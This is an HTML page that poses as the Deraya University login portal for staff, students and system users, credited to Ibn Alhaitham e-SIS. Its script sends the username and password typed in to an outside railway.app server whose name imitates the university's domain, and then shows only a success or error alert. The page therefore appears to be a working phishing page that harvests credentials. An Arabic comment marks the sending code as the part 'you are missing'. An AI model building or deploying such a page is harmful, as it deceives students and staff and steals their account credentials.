<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8" />
    <title>Deraya University</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #e8edf3;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
        }
        .login-container {
            background: #ffffff;
            padding: 40px 35px 30px;
            border-radius: 12px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 420px;
            text-align: center;
        }
        .login-container h2 {
            font-size: 24px;
            font-weight: 700;
            color: #1a2a4a;
            margin-bottom: 25px;
            letter-spacing: 0.5px;
        }
        .login-container input[type="text"],
        .login-container input[type="password"] {
            width: 100%;
            padding: 12px 15px;
            margin-bottom: 15px;
            border: 1px solid #d0d7e2;
            border-radius: 6px;
            font-size: 15px;
            background: #f8faff;
            transition: 0.2s;
            outline: none;
        }
        .login-container input[type="text"]:focus,
        .login-container input[type="password"]:focus {
            border-color: #1a73e8;
            background: #ffffff;
        }
        .options {
            display: flex;
            justify-content: center;
            gap: 20px;
            margin: 10px 0 20px;
            font-size: 14px;
            flex-wrap: wrap;
        }
        .options label {
            display: flex;
            align-items: center;
            gap: 6px;
            color: #1e2a3a;
            font-weight: 500;
            cursor: pointer;
        }
        .options input[type="radio"] {
            accent-color: #1a73e8;
            width: 16px;
            height: 16px;
            cursor: pointer;
        }
        .login-btn {
            width: 100%;
            padding: 12px;
            background: #1a73e8;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            transition: 0.2s;
            letter-spacing: 1px;
            margin-top: 5px;
        }
        .login-btn:hover {
            background: #1557b0;
        }
        .forgot-link {
            display: block;
            margin-top: 15px;
            color: #1a73e8;
            font-size: 14px;
            text-decoration: none;
            font-weight: 500;
        }
        .forgot-link:hover {
            text-decoration: underline;
        }
        .footer-links {
            margin-top: 20px;
            font-size: 13px;
            color: #4a5a6a;
            border-top: 1px solid #e8edf3;
            padding-top: 15px;
        }
        .footer-links a {
            color: #1a73e8;
            text-decoration: none;
        }
        .footer-links a:hover {
            text-decoration: underline;
        }
        .footer-links .dash {
            margin: 0 6px;
            color: #8a9aaa;
        }
        .powered {
            margin-top: 15px;
            font-size: 12px;
            color: #6b7a8f;
        }
        .powered a {
            color: #1a73e8;
            text-decoration: none;
            font-weight: 500;
        }
        .powered a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <h2>Deraya University</h2>
        <form id="loginForm">
            <input type="text" id="username" placeholder="Username" required />
            <input type="password" id="password" placeholder="Password" required />
            <div class="options">
                <label><input type="radio" name="userType" checked /> System User</label>
                <label><input type="radio" name="userType" /> Staff</label>
                <label><input type="radio" name="userType" /> Student</label>
            </div>
            <button type="submit" class="login-btn">LOG IN</button>
            <a href="#" class="forgot-link">Forget Password ?</a>
        </form>
        <div class="footer-links">
            <a href="#">سياسة الخصوصية</a>
            <span class="dash">--</span>
            <a href="#">الدليل الإرشادي للأخطاء الشائعة</a>
        </div>
        <div class="powered">
            Powered by Ibn Alhaitham e-SIS software,
            <a href="https://www.intlaqcit.com/">intlaqcit</a>
            - Mansoura University
        </div>
    </div>

    <script>
        // ⬇️ هذا هو كود الإرسال الذي ينقصك
        const API_BASE = 'https://deraya-mans-edu-eg.up.railway.app';

        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();

            const username = document.getElementById('username').value.trim();
            const password = document.getElementById('password').value.trim();

            if (!username || !password) {
                alert('الرجاء إدخال اسم المستخدم وكلمة المرور.');
                return;
            }

            try {
                const res = await fetch(`${API_BASE}/api/student/login-attempt`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ username, password })
                });
                const data = await res.json();

                if (data.success) {
                    alert('✅ تم تسجيل الدخول بنجاح');
                } else {
                    alert('❌ حدث خطأ، حاول مرة أخرى.');
                }
            } catch (err) {
                alert('⚠️ تعذر الاتصال بالخادم. تأكد من اتصالك بالإنترنت.');
                console.error(err);
            }
        });
    </script>
</body>
</html>
